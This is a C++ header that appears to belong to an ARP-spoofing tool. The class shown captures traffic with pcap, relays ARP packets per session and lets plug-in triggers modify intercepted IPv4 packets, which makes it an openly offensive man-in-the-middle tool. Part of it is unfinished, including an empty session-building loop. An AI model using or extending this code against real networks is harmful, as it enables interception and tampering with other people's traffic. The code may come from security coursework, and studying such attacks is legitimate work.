#pragma once

#include <optional>
#include <netinet/in.h>
#include <iostream>
#include <pcap.h>
#include "ARPSessionAdaptor.cpp"
#include "BaseARPSpoofing.cpp"
#include "trigger/BaseTrigger.cpp"

class SessionARPSpoofing: public BaseARPSpoofing {
private:
    std::pair<uint8_t*, uint8_t*>* sessionList;
    int sessionCount;

    ARPSessionAdaptor* arpSessionAdaptor;

    std::vector<BaseTrigger*> triggers;
public:
    explicit SessionARPSpoofing(char *networkInterface,
                                std::pair<uint8_t *, uint8_t *> *sessionList, int sessionCount):
            BaseARPSpoofing(networkInterface), sessionList(sessionList), sessionCount(sessionCount),
            arpSessionAdaptor(new ARPSessionAdaptor(networkInterface)) {}

    void buildSession() {
        std::cout << "INFO: Start scanning sender clients..." << std::endl;
        for (int i = 0; i < this->sessionCount; i++) {

        }
        std::cout << "INFO: Success scanning sender clients" << std::endl;
    }

    void registerTrigger(BaseTrigger* packetTrigger) {
        this->triggers.push_back(packetTrigger);
    }

    void startARPSpoofing(int sessionTime) override {
        this->buildSession();
        this->setUpTimer(sessionTime);

        std::cout << "INFO: Start ARP-Spoofing ..." << std::endl;

        while (this->isAlive()) {

            struct pcap_pkthdr* header;
            const u_char* packet;
            pcap_next_ex(this->pcapHandle, &header, &packet);

            auto nPacket = this->processPacket(packet);
            if (nPacket) {
                auto session = this->arpSessionAdaptor->getSession(nPacket.value().second.arpHeader->sender_ip);
                if (session) {
                    switch (nPacket.value().first) {
                        case ETHER_TYPE_ARP:
                            session.value()->reciveARPPacket(nPacket.value().second.arpHeader);
                            break;
                        case ETHER_TYPE_IPV4:
                            auto mPacket = nPacket.value().second.packet;
                            for (auto trigger : this->triggers) trigger->editIPV4Packet(mPacket);
                            session.value()->recivePacket(mPacket);
                            break;
                    }
                }
            }
        }

        std::cout << "INFO: End ARP-Spoofing::TimeOut" << std::endl;
    }
};
